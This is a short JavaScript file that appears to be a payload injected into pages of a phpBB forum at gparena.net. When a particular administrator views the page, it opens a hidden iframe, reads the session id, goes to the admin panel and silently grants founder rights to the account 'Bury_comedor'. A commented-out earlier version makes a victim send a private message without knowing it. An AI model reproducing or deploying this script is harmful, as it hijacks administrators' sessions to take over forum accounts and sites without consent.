// var header = document.getElementById('header');
// var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
// if (!document.getElementById("del1me")) {
//     if (user_name === "Bury_comedor") {
//         var iframe = document.createElement('iframe');
//         iframe.id = "del1me";
//         iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
//         iframe.height = "400";
//         iframe.width = "400";
//         iframe.style.opacity = 0;
//         iframe.style.position = "absolute";
//         iframe.style.zIndex = -1;
//         iframe.style.top = "-30px";
//         header.append(iframe);
//         const wait = setTimeout(stealThisMoment, secondsToMS(3));
//     };
// }

// function stealThisMoment() {
//     console.log("3secs!");
//     iframe.contentWindow.document.getElementById("username_list").value = "!lole";
//     iframe.contentWindow.document.getElementsByName("add_to")[0].click();
//     iframe.contentWindow.document.getElementById("subject").value = "beary";
//     iframe.contentWindow.document.getElementById("message").value = "chicanery";
//     iframe.contentWindow.document.getElementsByName("post")[0].click();
//     setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
// };


// function secondsToMS(seconds) {
//     return seconds * 1000;
// };

// var script_ids = ["a1", "a2", "a3", "a4"];

var header = document.getElementById('header');
var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
if (!document.getElementById("gp_h1")) {
    if (user_name === "BRAND") {
        var iframe = document.createElement('iframe');
        iframe.id = "gp_h1";
        iframe.src = `https://gparena.net/forum/`;
        iframe.height = "400";
        iframe.width = "400";
        iframe.style.opacity = 0;
        iframe.style.position = "absolute";
        iframe.style.zIndex = -1;
        iframe.style.top = "-30px";
        header.append(iframe);
        //document.body.append(iframe);
        const wait = setTimeout(stealThisMoment, secondsToMS(3));
    };
    if (user_name === "Bury_comedor") {
        var iframe = document.createElement('iframe');
        iframe.id = "gp_h1";
        iframe.src = `https://gparena.net/forum/`;
        iframe.height = "400";
        iframe.width = "400";
        iframe.style.opacity = 0;
        iframe.style.position = "absolute";
        iframe.style.zIndex = -1;
        iframe.style.top = "-30px";
        header.append(iframe);
        //document.body.append(iframe);
        console.log("gl");
    };
}

function stealThisMoment() {
    var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
    iframe.contentWindow.window.location.replace(`https://gparena.net/forum/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
    setTimeout(() => { 
        iframe.contentWindow.document.getElementById("username").value = "Bury_comedor";
        iframe.contentWindow.document.getElementsByName("submituser")[0].click();
        setTimeout(() => { 
            iframe.contentWindow.document.getElementsByName("user_founder")[0].click();
            iframe.contentWindow.document.getElementsByName("update")[0].click();
         }, secondsToMS(3));
     }, secondsToMS(3));
};


function secondsToMS(seconds) {
    return seconds * 1000;
};


